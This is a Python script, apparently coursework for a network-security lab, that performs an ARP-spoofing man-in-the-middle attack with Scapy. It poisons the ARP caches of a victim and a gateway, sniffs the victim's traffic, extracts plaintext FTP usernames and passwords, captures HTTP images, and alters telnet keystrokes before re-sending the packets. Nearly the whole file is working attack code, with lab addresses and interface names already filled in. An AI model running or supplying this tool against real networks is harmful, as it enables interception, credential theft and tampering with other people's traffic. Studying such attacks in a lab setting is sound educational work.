from multiprocessing import Process
import scapy.all as scapy
from scapy import pipetool
from scapy.layers.http import HTTPRequest, HTTPResponse, TCP
from scapy.scapypipes import SniffSource
from scapy.utils import wrpcap, PcapWriter
from scapy.pipetool import *

import os
import sys
import time


def iteratePcap(pcap_path):
    yield from scapy.PcapReader(pcap_path)


def writePcap(pcap_name, pkt_list):
    path_root = "data/captures/filtered"
    save_path = os.path.join(path_root, pcap_name)
    wrpcap(pcap_name, pkt_list, append=True)


def get_mac(ip):
    """
    this function gets and records the MAC address of the network
    :param ip:
    :return: mac address of device allocated ip
    """
    arp_pkt = scapy.ARP(pdst=ip)
    broadcast_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    responses = scapy.srp(broadcast_pkt / arp_pkt,
                          timeout=1,
                          verbose=False)[0]
    for rep in responses:
        return rep[1].hwsrc


class Arper:
    def __init__(self, victim, destination, interface="eth0", option=1):
        self.victim_ip = victim
        self.gateway_ip = destination
        self.interface = interface

        self.question_num = option

        self.victim_mac = get_mac(self.victim_ip)
        self.gateway_mac = get_mac(self.gateway_ip)

        self.poisoner = Process(target=self.poison, daemon=True)
        self.sniffer = Process(target=self.sniff, args=(-1,), daemon=True)

        self.tot_written = 0
        self.first100 = []
        self.gotfirst100 = False

        self.pkt_capture_count = 0

    def run(self):
        """
        create concurrent processes to sniff and poison
        """

        self.poisoner.start()
        self.sniffer.start()

        self.poisoner.join()
        self.sniffer.join()

    def poison(self):
        victim_poison = scapy.ARP(op=2, psrc=self.gateway_ip, pdst=self.victim_ip, hwdst=self.victim_mac)
        gateway_poison = scapy.ARP(op=2, psrc=self.victim_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

        run = True
        while run:
            try:
                scapy.send(victim_poison)
                scapy.send(gateway_poison)
            except KeyboardInterrupt:
                self.end()
                run = False

            time.sleep(10)
        sys.exit(1)

    def packet_sniff(self, filter, count=1):
        while True:
            packet = scapy.sniff(count=count, filter=filter)
            # print(packet.summary())
            yield packet

    def sniff(self, count=100):
        # this function performs the sniffing attack

        victim_ip_filter = f"ip host {self.victim_ip}"
        packet_gen = self.packet_sniff(victim_ip_filter, count=10)

        i = 0
        while i != count:
            pkt_batch = next(packet_gen)
            i += len(pkt_batch)
            self.filterWrite(pkt_batch)

            print(f"captured {self.victim_ip} {i}/{count}")

    def filterWrite(self, captured_packets):
        #print(f"captured {self.victim_ip} {self.pkt_capture_count}")
        self.pkt_capture_count += 1

        resulting_pkts = filter(capture_itr=captured_packets, option=self.question_num).processPackets(captured_packets)

        filename = f"Task 2 - Step {self.question_num}.pcap"

        if self.tot_written >= 100 and self.gotfirst100 == False and self.question_num == 1:
            writePcap(filename, self.first100[:99])
            self.gotfirst100 = True
        else:
            self.first100.append(captured_packets)
            self.tot_written += len(captured_packets)

        if len(resulting_pkts) != 0:
            writePcap(filename, resulting_pkts)

    def restore(self):
        victim_cure = scapy.ARP(op=2,
                                psrc=self.victim_ip,
                                pdst=self.gateway_ip,
                                hwsrc=self.victim_mac,
                                hwdst="ff:ff:ff:ff:ff:ff")
        gateway_cure = scapy.ARP(op=2,
                                 psrc=self.gateway_ip,
                                 pdst=self.victim_ip,
                                 hwsrc=self.gateway_mac,
                                 hwdst="ff:ff:ff:ff:ff:ff")

        scapy.send(victim_cure)
        scapy.send(gateway_cure)

    def end(self):
        self.restore()
        # sys.exit(1)


class filter:
    def __init__(self, capture_itr, option):
        self.capture_itr = capture_itr
        self.option = option
        # self.packets = [pkt for pkt in capture_itr]

    def processPackets(self, pkt_itr):
        filtered_pkts = []
        pass_filter = False

        counter = 0
        for pkt in self.capture_itr:
            if self.option == 1:
                if counter < 100:
                    filtered_pkts.append(pkt)
                    pass_filter = True
            elif self.option == 2:
                if self.longinPkt(pkt):
                    print("login captured")
                    filtered_pkts.append(pkt)
                    pass_filter = True
            elif self.option == 3:
                if self.respImgPkt(pkt):
                    print("image captured")
                    filtered_pkts.append(pkt)
                    pass_filter = True
            elif self.option == 4:
                if self.telnetPkt(pkt):
                    print("telnet captured")
                    # filtered_pkts.append(pkt)
                    modified_pkt = self.modifyTCPDFData(pkt=pkt, repalceWith="R")
                    pass_filter = True
                    if modified_pkt is not None:
                        filtered_pkts.append(modified_pkt)
                        scapy.send(modified_pkt)
                    else:
                        filtered_pkts.append(pkt)
            counter += 1

        # telnet replacement here
        return filtered_pkts

    def inRawDataFilter(self, pkt, filter):
        if filter in pkt:
            return True
        return False

    def isFTP(self, pkt):
        if pkt.haslayer("TCP") and pkt.haslayer("Raw"):
            return True
        return False

    def isSuccessfulLogin(self, pkt_data):
        return self.inRawDataFilter(filter="230", pkt=pkt_data)

    def getLogins(self, extract=False):
        """
        gets the login details
        not part of CW but got board
        :param extract:
        :return:
        """
        username_search = ["USER", "user"]
        # username_search.extend([w.upper() for w in username_search])
        password_search = ["PASS", "pass"]
        # password_search.extend([w.upper() for w in password_search])

        usernames = []
        passwords = []
        login_contr = 0
        for pkt in self.capture_itr:
            if self.isFTP(pkt):
                try:
                    raw_data = pkt["Raw"].load.decode("utf-8")
                except:
                    raw_data = pkt["Raw"].load.decode("latin-1")

                new_creds_found = False

                if any(ext in raw_data for ext in username_search):
                    for username_field in username_search:
                        if len(raw_data.split(username_field)) > 1:
                            usernames.append(raw_data.split(username_field)[1].strip())
                            new_creds_found = True

                if any(ext in raw_data for ext in password_search):
                    for password_field in password_search:
                        if len(raw_data.split(password_field)) > 1:
                            passwords.append(raw_data.split(password_field)[1].strip())
                            new_creds_found = True

                if not new_creds_found:
                    # check for a sucsessfull login response
                    if self.isSuccessfulLogin(raw_data):
                        login_contr += 1

        if extract:
            print("#####Successful logins#####")
            for i in range(min(len(usernames), login_contr)):
                print(f"USER:   {usernames[i]},    PASS:    {passwords[i]}")

            print("#####all attempted logins#####")
            for i in range(min(len(usernames), len(passwords))):
                print(f"USER:   {usernames[i]},    PASS:    {passwords[i]}")

    def longinPkt(self, pkt):
        """
        true if packet containing plain text password and/or username.
        :param pkt:
        :return:
        """
        username_search = ["USER"]
        # username_search.extend([w.upper() for w in username_search])
        password_search = ["PASS"]
        # password_search.extend([w.upper() for w in password_se

        if self.isFTP(pkt):
            try:
                raw_data = pkt["Raw"].load.decode("utf-8")
            except:
                raw_data = pkt["Raw"].load.decode("latin-1")

            new_creds_found = False

            if any(ext in raw_data for ext in username_search):
                for username_field in username_search:
                    if len(raw_data.split(username_field)) > 1:
                        return True

            if any(ext in raw_data for ext in password_search):
                for password_field in password_search:
                    if len(raw_data.split(password_field)) > 1:
                        return True

        return False

    def respImgPkt(self, pkt):
        """
        true if HTTP packet is respons & contains images.
        :return:
        """
        # test if HTTPResponse
        if pkt.haslayer("TCP"):
            if pkt.haslayer(HTTPResponse):
                header = pkt.payload.payload.payload.payload
                content_type = header.Content_Type
                try:
                    string_ctype = content_type.decode("utf-8")
                except:
                    string_ctype = content_type.decode("latin-1")

                if "image" in string_ctype:
                    return True
        return False

    def telnetPkt(self, pkt):
        """
        true if Telnet packets and replace each typed character in the communication to ‘R’.
        :return:
        """
        # test for telnet port
        # test for telnet protocol

        # maybe test if the payload contains the character R....
        if pkt.haslayer("TCP"):#and "telnet" in pkt.summary():
            source_port = pkt[scapy.TCP].sport
            destiantion_port = pkt[scapy.TCP].dport
            if (source_port == 23 or destiantion_port == 23) or (source_port == 3005 or destiantion_port == 3005):
                return True

        return False

    def TCPChecksum(self, pkt):
        del pkt.chksum
        return pkt.__class__(bytes(pkt))

    def modifyTCPDFData(self, pkt, repalceWith="R"):
        payload = pkt[TCP].payload
        if payload.name == "NoPayload":
            return pkt
        else:
            try:
                data = payload.load.decode("utf-8")
                if len(data) == 0:
                    return
                r_data = "".join(["R" for _ in range(len(data))])
                bytes_data = bytes(pkt[TCP].payload.load.decode("utf-8").replace(data, r_data), 'UTF-8')
                pkt[TCP].payload.load = bytes_data
                pkt[TCP].payload.original = bytes_data
                correct_checksum_pkt = self.TCPChecksum(pkt)
                return correct_checksum_pkt
            except:
                pass


def arpSpoof(victim, destination, interface, option=1):
    # (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    # (victim, destination, interface) = ("192.168.2.120", "192.168.2.1", "wlp59s0")

    myarp = Arper(victim, destination, interface, option=option)
    myarp.run()


def logins():
    pkt_iterator = iteratePcap("data/captures/example/wwb001-hackerwatch.pcapng")
    filterer = filter(capture_itr=pkt_iterator)
    filterer.getLogins()


def questions():
    #pkt_iterator = iteratePcap("data/captures/example/wwb001-hackerwatch.pcapng")
    #pkt_iterator = iteratePcap("data/captures/example/http_witp_jpegs.cap")
    pkt_iterator = iteratePcap("data/captures/example/telnet.cap")
    filterer = filter(capture_itr=pkt_iterator, option=4)
    filtered = filterer.processPackets(pkt_iterator)

    for i in filtered:
        writePcap("test_cap.pcap", i)


if __name__ == '__main__':
    """
    please pick options:
    1/2/3/4
    depending on what stage you are assessing!
    """
    stage = 1
    victim = "10.9.0.5"
    destination = "10.9.0.6"
    interface = "vetha75a8aa"

    print("change setup in the __main__\n")
    print("Current settings:")
    print(f"stage = {stage}\ninterface = {interface}\nvictim = {victim}\ndestination = {destination}\n")
    arpSpoof(victim, destination, interface, option=stage)
    #questions()
